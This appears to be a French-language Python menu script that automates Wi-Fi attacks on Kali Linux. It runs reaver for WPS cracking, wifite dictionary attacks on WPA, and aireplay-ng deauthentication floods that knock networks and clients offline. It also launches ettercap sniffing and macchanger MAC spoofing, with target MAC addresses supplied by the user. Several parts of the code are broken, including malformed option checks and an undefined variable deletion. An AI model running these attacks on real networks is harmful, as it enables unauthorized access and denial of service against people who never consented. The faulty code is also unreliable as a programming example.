import os
import time
import subprocess
import datetime
# rouge    \u001b[31m
# bleu     \u001b[34m
# annuler  \u001b[0m

os.system("clear") 
print("\u001b[34mWIFI-HACKING-KALI-LINUX\u001b[0m\n\n\n") 
print("\u001b[34m????????????????????????????????????????\u001b[0m") 
print("\u001b[34m????\u001b[0m\u001b[31m@\u001b[0m\u001b[34m??????????????\u001b[0m\u001b[31m@\u001b[0m\u001b[34m??\u001b[0m\u001b[31m@\u001b[0m\u001b[34m??\u001b[0m\u001b[31m@@@@@\u001b[0m\u001b[34m??\u001b[0m\u001b[31m@\u001b[0m\u001b[34m???????\u001b[0m")
print("\u001b[34m?????\u001b[0m\u001b[31m@\u001b[0m\u001b[34m??????\u001b[0m\u001b[31m@\u001b[0m\u001b[34m?????\u001b[0m\u001b[31m@\u001b[0m\u001b[34m??????\u001b[0m\u001b[31m@\u001b[0m\u001b[34m??????????????\u001b[0m")
print("???????@???@?@???@????@??@@@@@??@???????")
print("????????@?@???@?@?????@??@??????@???????") 
print("?????????@?????@??????@??@??????@???????") 
print("????????????????????????????????????????") 
print("\n\u001b[31mACTONETOR && HACKINGTOOL\u001b[0m\n") 
print("********************************************") 
print("* \u001b[34mACTONETOR, 2021\u001b[0m                          *") 
print("* \u001b[34mTIKTOK:actone_toranonyme\u001b[0m                 *") 
print("* \u001b[34mINSTAGRAM:Lefrentoune\u001b[0m                    *") 
print("*                                          *") 
print("********************************************\n\n\n") 
print("\u001b[31mINSTALLATION DES REQUIREMENT\u001b[0m\n") 
print("CHARGEMENT")
char = print("[                    ]  %0 ")
subprocess.run('apt autoremove && apt autoclean')
time.sleep(2)
del char1 
char1 = print("[#####               ]  %25 ") 


#présentation
print("WIFI-HACKING-KALI-LINUX\n\n\n\n")
print('?????@????????????@??@??@@@@??@?????????')
print('??????@?????@?????@?????@???????????????')
print('???????@???@?@???@???@??@@@@??@?????????')
print('????????@?@???@ @????@??@?????@?????????')
print('?????????@?????@?????@??@?????@?????????')
print("\nACTONE_TOR && HACKINGTOOL\n")
print("********************************************")
print("*   ACTONE_TOR, 2021                       *")
print("*   TIKTOK:actone_toranonyme               *")
print("*   INSTAGRAM:Lefrentoune                  *")
print("*                                          *")
print("********************************************\n\n\n")
print("1. WPS cracking")
print("2. WPA (2) cracking")
print("3. Attaque par dénie de service(Dos)")
print("4. Déconecter un client de ton wifi (aireplay-ng)")
print("5. Autre Tool wifi-hacking") 
#fin présentation

#opt = � l'option choisis et input pour garde la valeur entrer  
opt = input("\nChoisisser une options :  ")
#si opt n'est pas égal a 1 il vas taper l'erreur
if not opt == str("1") and ("2") and ("3") and ("4") and ("5") :
    print("ERREUR: Entrer une options valide ")
#si opt = 1 il vas faire un else 'afficher la suite '

if opt == str("1"):
    os.system("clear")
    print("\n************************************************************")
    print("\n***************Bienvenue dans l'interface 1*****************")
    print("\n************************************************************\n\n\n")
    cont = input("Vouller vous vraiment continuer (oui ou non) : ")
    if cont == str("oui"):
   
    #if =  la commande sudo ifconfig
    
        ifc = ("sudo ifconfig")
   
    #avec subprocess nous voulons executer la commande if
   
        os.system(ifc)
   
    #inter = la réponse entrer sur la question "Entrer le nom de votre interface"
   
        inter = input("\n\nEntrer le nom de votre interface a utiliser : ")
        os.system("clear")
    #SI = la commande airmon-ng start + inter qui signifi l'interface choisis
    
        SI = ("airmon-ng start ") + inter
   
    #nous allons executer la commande SI avec subprocess
   
        os.system(SI)

    #Pour avoir l'interface wlan0mon en prioriter

        IFUP = ("ifconfig wlan0mon up")

        #executer la commande IFUP
        os.system(IFUP)
        os.system("clear")
        print("Faite Ctrl + c pour arreter la capture\n\n")
        WASH = ("wash -i wlan0mon")
        os.system("clear")
        os.system(WASH)
    
    
        #MAC = la réponse de l'adresse Mac entrer

        MAC = input("Entrer l'adresse mac du réseau cible : ")

        os.system("clear")
        os.system("reaver -i wlan0mon -b " + MAC + " -vv")
    quite = input("voulez vous enlever votre interface en pause ? (oui ou non) : ")
    if quite == str("non"):
        quit()
    if quite == str("oui"):
        msp = input("Veullier enter le nom de votre interface mise en pause : ")
        os.system("ifconfig " + msp + " up")
        os.system("clear")
        os.system("airmon-ng stop wlan0mon")
        os.system("clear")
        quit()
    if cont == str("non"):
        quit()
        
        
if opt == str("3"):
    os.system("clear")
    print("************************************************************")
    print("***************Bienvenue dans l'interface 3*****************")
    print("************************************************************\n")
    cont = input("Vouller vous vraiment continuer (oui ou non) : ")
    if cont == str("oui"):
        os.system("ifconfig")
        inter2 = input("\nEntrer le nom exacte de votre interface a utiliser : ")

        os.system("airmon-ng start " + inter2)
        os.system("clear")

        os.system("airodump-ng wlan0mon")
        mac2 = input("Entrer l'adresse mac du réseau cible : ")
        cha = input("Entrer le canal du réseau cible (CH) : ")

        os.system("clear")
        os.system("aireplay-ng -0 0 -a" + mac2 + " --ignore-negative-one wlan0mon")
    if cont == str("non"):
        quit()
    quite = input("voulez vous enlever votre interface en pause ? (oui ou non) : ")
    if quite == str("non"):
        quit()
    if quite == str("oui"):
        msp = input("Veullier enter le nom de votre interface mise en pause : ")
        os.system("ifconfig " + msp + " up")
        os.system("clear")
        os.system("airmon-ng stop wlan0mon")
        os.system("clear")
        quit()
    if cont == str("non"):
        quit()


if opt == str("2"):
    os.system("clear")
    print("************************************************************")
    print("***************Bienvenue dans l'interface 2*****************")
    print("************************************************************\n\n")
    print("1. Dicter la liste a utiliser")
    print("2. Utiliser la liste de base (recommander)\n\n")
    cont = input("Vouller vous vraiment continuer (oui ou non) : ")
    if cont == str("oui"):
        opls = input("Entrer une options valide : ")
        if not opls == str("1") and ("2"):
            print("ERREUR: Entrer une options valide")

        if opls == str("1") :
            lsr = input("Entrer le nom de la liste : ")
            os.system("clear")
            os.system("wifite --dict " + lsr)

        if opls == str("2"):
            os.system("clear")
            os.system("wifite --dict password.txt")
    if cont == str("non"):
        quit()
        quite = input("voulez vous enlever votre interface en pause ? (oui ou non) : ")
    if quite == str("non"):
        quit()
    if quite == str("oui"):
        msp = input("Veullier enter le nom de votre interface mise en pause : ")
        os.system("ifconfig " + msp + " up")
        os.system("clear")
        os.system("airmon-ng stop wlan0mon")
        os.system("clear")
        quit()
    if cont == str("non"):
        quit()


if opt == str("4"):
    os.system("clear")
    print("************************************************************")
    print("***************Bienvenue dans l'interface 4*****************")
    print("************************************************************\n\n\n") 
    cont = input("Vouller vous vraiment continuer (oui ou non) : ")
    if cont == str("oui"):
        os.system("ip addr")
        ip = input("\nVeullier entrer votre adresse IP (exemple: 192.2.122.0/24) : ")
        os.system("clear")
        os.system("nmap -sP " + ip + "\n\n\n")
        mace = input("Entrer le bssid du client cible : ")
        ip = input("Entrer l'adresse ip du client cible : ")
        os.system("clear")
        os.system("aireplay-ng --deauth 0 -a " + mace + " -k " + ip +  " wlan0")
    if cont == str("non"):
        quit()


if opt == str("5"):
    os.system("clear")
    print("************************************************************")
    print("***************Bienvenue dans l'interface 5*****************")
    print("************************************************************\n\n\n")
    cont = input("Vouller vous vraiment continuer (oui ou non) : ")
    if cont == str("oui"):
        print("1. Fern Wifi Cracker (Un outil kali linux pour cracker un réseau wifi de n'importe quel sécurité(WPA(2) WPS)")
        print("2. EtterCap-graphical (un outil pour renifler le réseau)")
        print("3. Macchanger (un outil pour changer son adresse mac (USURPATION)\n\n")
        inerf = input("Entrer une options valide : ")
    if not inerf == str("1") and ("2") and ("3"):
        print("ERREUR: Entrer une options valide")
    if inerf == str("1"):
        os.system("clear")
        os.system("fern-wifi-cracker")
    if inerf == str("2"):
        os.system("clear")
        os.system("sudo ettercap")
    if inerf == ("3"):
        dev = input("Entrer l'adresse mac pour changer la votre : ")
        os.system("clear")
        os.system("sudo macchanger -m " + dev)
    if cont == str("non"):
        quit()
